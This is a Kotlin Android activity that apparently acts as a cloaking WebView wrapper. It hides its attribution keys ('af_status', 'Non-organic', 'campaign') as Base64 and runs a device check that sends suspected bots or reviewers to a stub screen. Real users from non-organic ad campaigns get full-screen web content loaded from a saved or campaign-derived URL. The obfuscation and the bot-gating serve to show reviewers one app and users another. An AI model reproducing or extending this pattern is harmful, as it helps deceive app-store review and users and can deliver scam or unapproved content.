package com.bdleess.cyoowb

import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import com.bdleess.cyoowb.ADFB.ADD
import com.bdleess.cyoowb.ADFB.FFFB
import com.bdleess.cyoowb.DDAA.FbIF
import com.bdleess.cyoowb.DDAA.LLLO
import com.bdleess.cyoowb.GGG.STActivity
import com.bdleess.cyoowb.PPPA.*
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.*

@OptIn(DelicateCoroutinesApi::class)
var papapa = PAAPAPA()
var wwb = WWB()

@SuppressLint("StaticFieldLeak")
lateinit var krop: WebView
@SuppressLint("StaticFieldLeak")
lateinit var prog:ProgressBar
var apps_static: String? = null
var parametr: String? = null
@DelicateCoroutinesApi
class BC2 : AppCompatActivity() {
    private var CallAr: ValueCallback<Array<Uri>>? = null
    private var RequestCode = 100
    var Dd = DDDEV()
    var ad = ADD()
    var ll = LLLO()
    var ffb = FFFB()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        window.addFlags(1024)
        krop = findViewById(R.id.kroy)
        prog = findViewById(R.id.progressBar)
        val savedLink = getSharedPreferences(packageName, MODE_PRIVATE).getString("Loaws", null)
        ad.getAdvertId(this)


        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(OneSignalID)



        val AppsFlyer = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                for (i in p0!!.keys)
                    apps_static =
                        Objects.requireNonNull(p0[papapa.Decoder("YWZfc3RhdHVz")]).toString()
                Log.e("TAG","AppsStat: $apps_static")
                if (apps_static == papapa.Decoder("Tm9uLW9yZ2FuaWM=")) {
                    val laylo =
                        Objects.requireNonNull(p0[papapa.Decoder("Y2FtcGFpZ24=")]).toString()
                    parametr = papapa.ParseLine(laylo)
                }
            }

            override fun onConversionDataFail(p0: String?) {Log.e("TAG","FAIL: $p0")}
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {Log.e("TAG","ATTR: $p0")}
            override fun onAttributionFailure(p0: String?) {Log.e("TAG","FAILURE: $p0")}

        }
        appsFlyerID = AppsFlyerLib.getInstance().getAppsFlyerUID(this@BC2)
        AppsFlyerLib.getInstance().run {
            init(papapa.Decoder(apDevKey), AppsFlyer, this@BC2)
            start(this@BC2)
        }



      krop.webViewClient = object : WebViewClient() {
          override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
              super.onPageStarted(view, url, favicon)
              if(url?.contains(papapa.Decoder("NDA0"))==true){
                  val ipe = Intent(this@BC2,STActivity::class.java)
                  startActivity(ipe)
              }
              prog.visibility = View.INVISIBLE
          }

          override fun onPageFinished(view: WebView?, url: String?) {
              super.onPageFinished(view, url)
              getSharedPreferences(packageName, MODE_PRIVATE).edit().putString("Loaws",url).apply()
              //pixqw.edit().putString("kopav-15123", url).apply()

          }
      }

        if (Dd.Dev(this) == 1) {
            GlobalScope.launch {
                ll.DD()
                ffb.startFB(FbIF!!, this@BC2)
                if (savedLink != null) {
                    runOnUiThread(Runnable {
                        wwb.startWEB(kroy)
                        kroy.loadUrl(savedLink.toString())
                    })
                } else {
                    Handler(Looper.getMainLooper()).postDelayed({
                        papapa.startTest(this@BC2)
                    }, 5000)
                }
            }

        } else {
            val intent = Intent(this, STActivity::class.java)
            startActivity(intent)
            Log.e("TAG","BOT")
        }


    }


    val webViewCH = object : WebChromeClient() {
        override fun onShowFileChooser(
            webView: WebView?,
            filePathCallback: ValueCallback<Array<Uri>>?,
            fileChooserParams: FileChooserParams?
        ): Boolean {
            if (CallAr != null) {
                CallAr!!.onReceiveValue(null)
                CallAr = null
            }
            CallAr = filePathCallback
            try {
                startActivityForResult(fileChooserParams!!.createIntent(), RequestCode)
            } catch (e: ActivityNotFoundException) {
                CallAr = null
                return false
            }
            return true
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RequestCode) {
            if (CallAr == null) return
            CallAr!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data))
            CallAr = null
        }
    }


    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (event.action == KeyEvent.ACTION_DOWN) {
            if (keyCode == KeyEvent.KEYCODE_BACK) {
                if (kroy.canGoBack()) {
                    kroy.goBack()
                }
                return true
            }
        }
        return super.onKeyDown(keyCode, event)
    }


}